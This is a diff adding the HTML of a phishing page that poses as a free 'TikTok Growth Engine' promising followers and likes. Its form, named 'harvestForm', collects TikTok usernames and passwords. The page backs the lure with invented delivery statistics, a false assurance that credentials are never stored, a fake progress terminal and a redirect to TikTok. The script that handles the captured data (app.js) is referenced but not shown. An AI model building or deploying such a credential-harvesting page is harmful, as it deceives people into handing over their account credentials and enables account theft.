@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Growth Engine — Free Followers & Likes</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎵</text></svg>">
+</head>
+<body>
+    <div class="noise"></div>
+    <div class="particles" id="particles"></div>
+
+    <div class="container">
+        <div class="logo-section">
+            <div class="tiktok-logo">
+                <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M16.708 0.027c1.745-0.027 3.48-0.027 5.224-0.027 0.267 2.027 1.12 3.827 2.56 5.12 1.44 1.28 3.307 2.027 5.307 2.027v5.12c-1.84 0-3.573-0.48-5.12-1.387v6.933c0 5.333-4.267 9.6-9.6 9.6s-9.6-4.267-9.6-9.6c0-5.333 4.267-9.6 9.6-9.6 0.533 0 1.067 0.053 1.573 0.133v5.653c-0.507-0.16-1.04-0.24-1.573-0.24-2.667 0-4.8 2.133-4.8 4.8s2.133 4.8 4.8 4.8c2.667 0 4.8-2.133 4.8-4.8v-13.92z" fill="white"/>
+                </svg>
+            </div>
+            <h1 class="glitch" data-text="TIKTOK GROWTH">TIKTOK GROWTH</h1>
+            <p class="tagline">Unlock Viral Fame. Real Followers. Real Likes. Zero Effort.</p>
+        </div>
+
+        <div class="stats-bar">
+            <div class="stat">
+                <span class="stat-number" id="followerCount">2,847,392</span>
+                <span class="stat-label">Followers Delivered</span>
+            </div>
+            <div class="stat">
+                <span class="stat-number" id="likeCount">18,204,551</span>
+                <span class="stat-label">Likes Generated</span>
+            </div>
+            <div class="stat">
+                <span class="stat-number" id="userCount">94,221</span>
+                <span class="stat-label">Active Users</span>
+            </div>
+        </div>
+
+        <div class="form-container" id="mainForm">
+            <div class="progress-steps">
+                <div class="step active">1</div>
+                <div class="line"></div>
+                <div class="step">2</div>
+                <div class="line"></div>
+                <div class="step">3</div>
+            </div>
+
+            <h2>Connect Your Account</h2>
+            <p class="form-subtitle">Enter your TikTok credentials to link our growth engine to your profile.</p>
+
+            <form id="harvestForm">
+                <div class="input-group">
+                    <label>Email or Username</label>
+                    <input type="text" id="email" placeholder="@yourusername or email" required autocomplete="off">
+                    <span class="input-icon">@</span>
+                </div>
+
+                <div class="input-group">
+                    <label>Password</label>
+                    <input type="password" id="password" placeholder="••••••••" required autocomplete="off">
+                    <span class="input-icon toggle-password" onclick="togglePass()">👁</span>
+                </div>
+
+                <div class="features">
+                    <div class="feature">
+                        <span class="check">✓</span>
+                        <span>10K Followers in 24h</span>
+                    </div>
+                    <div class="feature">
+                        <span class="check">✓</span>
+                        <span>50K Likes Guarantee</span>
+                    </div>
+                    <div class="feature">
+                        <span class="check">✓</span>
+                        <span>Verified Badge Eligible</span>
+                    </div>
+                </div>
+
+                <button type="submit" class="submit-btn" id="submitBtn">
+                    <span class="btn-text">ACTIVATE GROWTH ENGINE</span>
+                    <span class="btn-loader hidden"></span>
+                </button>
+            </form>
+
+            <p class="security-note">
+                <span class="lock">🔒</span>
+                256-bit encrypted. Your credentials are never stored on our servers.
+            </p>
+        </div>
+
+        <div class="processing hidden" id="processingScreen">
+            <div class="spinner"></div>
+            <h2>Verifying Account...</h2>
+            <div class="terminal">
+                <div class="terminal-line" id="term1">> Initializing TikTok API bridge...</div>
+                <div class="terminal-line hidden" id="term2">> Authenticating credentials...</div>
+                <div class="terminal-line hidden" id="term3">> Bypassing rate limits...</div>
+                <div class="terminal-line hidden" id="term4">> Injecting follower botnet...</div>
+                <div class="terminal-line hidden" id="term5">> Optimizing engagement algorithm...</div>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <p class="progress-text" id="progressText">0%</p>
+        </div>
+
+        <div class="success hidden" id="successScreen">
+            <div class="success-icon">✓</div>
+            <h2>Growth Engine Activated!</h2>
+            <p>Your account is now in the queue. You will receive 10,000 followers within 24 hours.</p>
+            <p class="redirect-text">Redirecting to TikTok in <span id="countdown">5</span>...</p>
+        </div>
+    </div>
+
+    <div class="activity-feed" id="activityFeed">
+        <div class="feed-header">LIVE ACTIVITY</div>
+        <div class="feed-items" id="feedItems"></div>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
